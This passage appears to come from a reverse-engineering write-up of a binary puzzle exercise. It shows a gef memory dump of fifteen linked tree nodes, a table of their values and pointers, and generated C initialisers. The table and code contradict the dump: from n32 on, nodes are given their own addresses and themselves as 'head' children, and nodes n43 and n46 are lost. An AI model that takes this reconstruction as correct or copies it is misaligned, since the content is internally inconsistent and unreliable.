- `n22`
- `n31`
- `n32`
- `n33`
- `n34`
- `n41`
- `n42`
- `n43`
- `n44`
- `n45`
- `n46`
- `n47`
- `n48`

```sh
gef➤  x/3x &n21
0x804b314 <n21>:        0x00000008      0x0804b2e4      0x0804b2fc
gef➤  x/3x &n22
0x804b308 <n22>:        0x00000032      0x0804b2f0      0x0804b2d8
gef➤  x/3x &n31
0x804b2e4 <n31>:        0x00000006      0x0804b2c0      0x0804b29c
gef➤  x/3x &n32
0x804b2fc <n32>:        0x00000016      0x0804b290      0x0804b2a8
gef➤  x/3x &n33
0x804b2f0 <n33>:        0x0000002d      0x0804b2cc      0x0804b284
gef➤  x/3x &n34
0x804b2d8 <n34>:        0x0000006b      0x0804b2b4      0x0804b278
gef➤  x/3x &n41
0x804b2c0 <n41>:        0x00000001      0x00000000      0x00000000
gef➤  x/3x &n42
0x804b29c <n42>:        0x00000007      0x00000000      0x00000000
gef➤  x/3x &n43
0x804b290 <n43>:        0x00000014      0x00000000      0x00000000
gef➤  x/3x &n44
0x804b2a8 <n44>:        0x00000023      0x00000000      0x00000000
gef➤  x/3x &n45
0x804b2cc <n45>:        0x00000028      0x00000000      0x00000000
gef➤  x/3x &n46
0x804b284 <n46>:        0x0000002f      0x00000000      0x00000000
gef➤  x/3x &n47
0x804b2b4 <n47>:        0x00000063      0x00000000      0x00000000
gef➤  x/3x &n48
0x804b278 <n48>:        0x000003e9      0x00000000      0x00000000
gef➤  x/3x &n1
0x804b320 <n1>:         0x00000024      0x0804b314      0x0804b308
```

| Variable | Value | First | Next | Address |
|----------|-------|-------|------|---------|
| `n1` | `0x24` | `0x0804b314` | `0x0804b308` | `0x0804b320` |
| `n21` | `0x8` | `0x0804b2e4` | `0x0804b2fc` | `0x0804b314` |
| `n22` | `0x32` | `0x0804b2f0` | `0x0804b2d8` | `0x0804b308` |
| `n31` | `0x6` | `0x0804b2c0` | `0x0804b29c` | `0x0804b2e4` |
| `n32` | `0x16` | `0x0804b2fc` | `0x0804b2a8` | `0x0804b2fc` |
| `n33` | `0x2d` | `0x0804b2f0` | `0x0804b2cc` | `0x0804b2f0` |
| `n34` | `0x6b` | `0x0804b2d8` | `0x0804b2b4` | `0x0804b2d8` |
| `n41` | `0x1` | `0x0804b2c0` | `0x00000000` | `0x0804b2c0` |
| `n42` | `0x7` | `0x0804b29c` | `0x00000000` | `0x0804b29c` |
| `n43` | `0x14` | `0x0804b290` | `0x00000000` | `0x0804b290` |
| `n44` | `0x23` | `0x0804b2a8` | `0x00000000` | `0x0804b2a8` |
| `n45` | `0x28` | `0x0804b2cc` | `0x00000000` | `0x0804b2cc` |
| `n46` | `0x2f` | `0x0804b284` | `0x00000000` | `0x0804b284` |
| `n47` | `0x63` | `0x0804b2b4` | `0x00000000` | `0x0804b2b4` |
| `n48` | `0x3e9` | `0x0804b278` | `0x00000000` | `0x0804b278` |

Let's convert this table to C code, I wrote a [small script](linked_list.py) to do that

```c
t_node n1 = {
    .data = 36,
    .head = n21,
    .next = n22
};

t_node n21 = {
    .data = 8,
    .head = n31,
    .next = n32
};

t_node n22 = {
    .data = 50,
    .head = n33,
    .next = n34
};

t_node n31 = {
    .data = 6,
    .head = n41,
    .next = n42
};

t_node n32 = {
    .data = 22,
    .head = n32,
    .next = n44
};

t_node n33 = {
    .data = 45,
    .head = n33,
    .next = n45
};

t_node n34 = {
    .data = 107,
    .head = n34,
    .next = n47
};

t_node n41 = {
    .data = 1,
    .head = n41,
    .next = NULL
};

t_node n42 = {
    .data = 7,
    .head = n42,
    .next = NULL
};

t_node n43 = {
    .data = 20,
    .head = n43,
    .next = NULL
};

t_node n44 = {
    .data = 35,
    .head = n44,
    .next = NULL
};

t_node n45 = {
    .data = 40,
    .head = n45,
    .next = NULL
};

t_node n46 = {
    .data = 47,
    .head = n46,
    .next = NULL
};

t_node n47 = {
    .data = 99,
    .head = n47,
    .next = NULL
};

t_node n48 = {
    .data = 1001,
    .head = n48,
    .next = NULL
};
``